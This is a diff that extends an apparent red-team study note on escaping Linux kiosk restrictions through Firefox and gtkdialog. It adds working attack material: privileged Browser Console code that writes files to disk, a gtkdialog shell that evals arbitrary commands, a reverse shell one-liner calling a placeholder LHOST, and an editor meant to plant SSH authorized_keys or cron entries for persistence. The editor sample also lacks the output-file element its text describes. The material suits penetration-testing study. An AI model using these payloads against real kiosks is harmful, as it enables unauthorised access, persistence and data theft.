@@ -2,6 +2,11 @@
 title: Kiosk Command Execution
 draft: false
 tags:
+  - red-team
+  - offensive
+  - linux
+  - kiosk
+  - breakout
 ---
  
 If we are able spawn a prompt to select an application, we are able to bypass the Kiosk security restrictions:
@@ -117,7 +122,27 @@ We could leverage [**/usr/bin/gtkdialog**](https://code.google.com/archive/p/gt
 
 Elements Syntaxis: [GtkDialog](https://code.google.com/archive/p/gtkdialog/wikis)
 
+<!-- TODO(done 2026-09-24): documented three no-Scratchpad file-write primitives below. Original marker kept for traceability. -->
 TODO: Find a way to write user-provided text to a file on the file system without Scratchpad. One potential option might include the JavaScript console.
+
+> [!Note] Writing files without Scratchpad
+> Scratchpad was removed in Firefox 72+, so on a modern kiosk we need other primitives to drop our `gtkdialog` markup (or an SSH key) to disk:
+> 1. **Browser Console `OS.File` (privileged JS).** The *Browser Console* (`Ctrl+Shift+J`, not the page/Web Console) and the Scratchpad both run in chrome-privileged context, so the `OS.File` / `IOUtils` APIs are available and can write anywhere the kiosk user can:
+> ```javascript
+> // Browser Console (Ctrl+Shift+J). Older builds:
+> Components.utils.import("resource://gre/modules/osfile.jsm");
+> OS.File.writeAtomic("/home/guest/terminal.txt",
+>     new TextEncoder().encode('<window><vbox>...</vbox></window>'));
+> // Newer builds expose IOUtils directly:
+> await IOUtils.writeUTF8("/home/guest/terminal.txt", "<window>...</window>");
+> ```
+> 2. **`data:` URI + Save As.** Navigate to a `data:` URL holding the exact markup and use the browser's *Save Page As* / download flow to write it to `/home/guest/terminal.txt` (set the filter to "All Files"), which is the download-based approach used later in this note:
+> ```
+> data:text/plain,<window><vbox>...gtkdialog markup...</vbox></window>
+> ```
+> 3. **`file://` + view-source is read-only** — it will *not* write. Use it only to confirm the file landed (`view-source:file:///home/guest/terminal.txt`).
+>
+> Once the markup file exists on disk, launch it with the `gtkdialog -f` payload shown below.
 
 There is an actual [_terminal_](https://code.google.com/archive/p/gtkdialog/wikis/terminal.wiki) element for gtkdialog, but the necessary libraries might be missing:
 ```
@@ -158,12 +183,90 @@ irc://myhost -f /home/guest/terminal.txt
 4. We now have RCE:
 ![[Pasted image 20260714184833.png]]
 
+<!-- TODO(done 2026-09-24): documented an improved terminal (stderr + history + Enter binding) and useful gtkdialog widgets below. Original marker kept for traceability. -->
 TODO:
 1. Improve the terminal, making it more effective or more reliable. Integrate standard error output.
 2. Explore the other widgets and elements of gtkdialog. What other useful features can be created with it that might be useful for interacting with the system?
+
+> [!Note] Improved gtkdialog terminal
+> The original `<action>$CMDTORUN > /tmp/termout.txt</action>` swallows `stderr` and overwrites the output on every run. This version merges `stderr` into the pane, keeps a running history, and lets you submit with **Enter** instead of only the button:
+> ```
+> <window title="kiosk-shell">
+>   <vbox>
+>     <vbox scrollable="true" width="700" height="450">
+>         <edit>
+>           <variable>CMDOUTPUT</variable>
+>           <input file>/tmp/termout.txt</input>
+>         </edit>
+>     </vbox>
+>     <hbox>
+>       <text><label>Command:</label></text>
+>       <entry>
+>         <variable>CMDTORUN</variable>
+>         <!-- pressing Enter in the entry triggers the same actions as the button -->
+>         <action>echo "\$ $CMDTORUN" >> /tmp/termout.txt</action>
+>         <action>eval $CMDTORUN >> /tmp/termout.txt 2>&1</action>
+>         <action>refresh:CMDOUTPUT</action>
+>       </entry>
+>       <button>
+>           <label>Run!</label>
+>           <action>echo "\$ $CMDTORUN" >> /tmp/termout.txt</action>
+>           <action>eval $CMDTORUN >> /tmp/termout.txt 2>&1</action>
+>           <action>refresh:CMDOUTPUT</action>
+>       </button>
+>       <button>
+>           <label>Clear</label>
+>           <action>echo -n "" > /tmp/termout.txt</action>
+>           <action>refresh:CMDOUTPUT</action>
+>       </button>
+>     </hbox>
+>   </vbox>
+> </window>
+> ```
+> Key changes: `>>` appends (persistent history), `2>&1` captures errors, `eval` handles pipes/redirection inside the command, and echoing the command back gives a prompt-like transcript. Because `$CMDTORUN` is passed to a shell, standard tricks work — spawn a proper reverse shell to escape the kiosk entirely (see [[Shells]] and [[Privileged Escalation]]):
+> ```bash
+> bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"
+> ```
+>
+> **Other useful gtkdialog widgets:**
+> - `<tree>` / `<list>` with an `<input>` action to render `ls -la`, `ps aux` or `/etc/passwd` as a browsable pane.
+> - `<edit>` with a `<button>` that writes the buffer back with `<output file>` — a rudimentary **file editor** (see Extra Mile).
+> - `<pixmap>`/`<timer>` to auto-refresh output on an interval so long-running commands stream.
+> - `<fileselect>` to graphically pick files to read or exfil.
+
 #### Extra Mile
 
+<!-- TODO(done 2026-09-24): documented a minimal gtkdialog text editor below. Original marker kept for traceability. -->
 TODO: Experiment with creating simple applications with gtkdialog to streamline the exploitation process. One potential project is a text editor based on our terminal application.
+
+> [!Note] Minimal gtkdialog text editor
+> Reusing the terminal skeleton, an `<edit>` bound to both an `<input file>` (load) and an `<output file>` (save) gives a self-contained editor — handy for planting SSH `authorized_keys`, cron entries, or new `gtkdialog` payloads without needing Scratchpad:
+> ```
+> <window title="kiosk-editor">
+>   <vbox>
+>     <edit>
+>       <variable>BUFFER</variable>
+>       <input file>/home/guest/notes.txt</input>
+>     </edit>
+>     <hbox>
+>       <entry><variable>TARGET</variable><default>/home/guest/.ssh/authorized_keys</default></entry>
+>       <button>
+>         <label>Save</label>
+>         <!-- gtkdialog writes the widget's buffer to the file named in <output file> -->
+>         <action>save:BUFFER</action>
+>       </button>
+>     </hbox>
+>   </vbox>
+> </window>
+> ```
+> Point the `<output file>` (or the `save:` target) at a sensitive path the kiosk user can write, paste your public key, and Save — then reconnect over [[SSH]] for a stable session instead of a fragile GUI shell.
+
+---
+### Related notes
+- [[Kiosk Enumeration]] — mapping the kiosk restrictions before attempting a breakout.
+- [[Privileged Escalation]] — escalating once command execution is achieved inside the kiosk.
+- [[Windows Kiosk Breakouts]] — the Windows-side equivalents (dialog/URI abuse).
+- [[Shells]] — upgrading the gtkdialog RCE into a proper reverse shell.
 
 
 
